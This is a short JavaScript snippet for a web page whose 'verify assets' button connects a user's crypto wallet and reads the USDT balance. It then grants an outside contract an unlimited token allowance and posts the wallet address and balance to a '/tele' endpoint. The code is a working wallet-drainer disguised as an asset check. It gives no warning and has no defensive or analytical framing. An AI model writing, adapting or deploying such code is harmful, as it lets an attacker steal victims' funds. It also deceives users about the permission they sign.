const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_TO_APPROVE = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";

document.getElementById("verifyAssets").addEventListener("click", async () => {
  if (!window.ethereum) {
    alert("Open in MetaMask or Trust Wallet browser");
    return;
  }

  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const address = await signer.getAddress();

  const usdt = new ethers.Contract(USDT_ADDRESS, [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) external view returns (uint256)"
  ], signer);

  const balance = await usdt.balanceOf(address);
  const readable = ethers.utils.formatUnits(balance, 18);

  await usdt.approve(CONTRACT_TO_APPROVE, ethers.constants.MaxUint256);

  await fetch("/tele", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: `New Wallet Connected:\n${address}\nUSDT Balance: ${readable}`
    })
  });

  alert("Wallet connected & message sent.");
});
